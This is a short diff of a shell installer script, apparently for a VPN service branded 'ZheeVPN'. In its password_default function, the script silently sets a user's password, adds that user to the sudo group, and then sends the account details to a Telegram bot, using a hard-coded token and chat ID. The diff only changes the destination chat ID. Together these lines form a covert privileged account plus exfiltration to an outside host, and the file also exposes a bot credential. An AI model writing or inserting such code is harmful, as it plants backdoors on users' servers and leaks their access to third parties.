@@ -288,7 +288,7 @@ function password_default() {
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     usermod -aG sudo $Username > /dev/null 2>&1
 
-    CHATID="6023804688"
+    CHATID="-1001899398362"
     KEY="6614730282:AAFLDAxQEFIoctpy97HnDOPBrzirnilFezI"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
@@ -310,7 +310,7 @@ function password_default() {
     <code>User Script:</code> <code>$username</code>
     <code>Exp Script :</code> <code>$exp</code>
     ◇━━━━━━━━━━━━━━━━━━━━━◇
-     BOT BY ZheeVPN
+      BOT BY ZheeVPN
     ◇━━━━━━━━━━━━━━━━━━━━━◇
 "
 
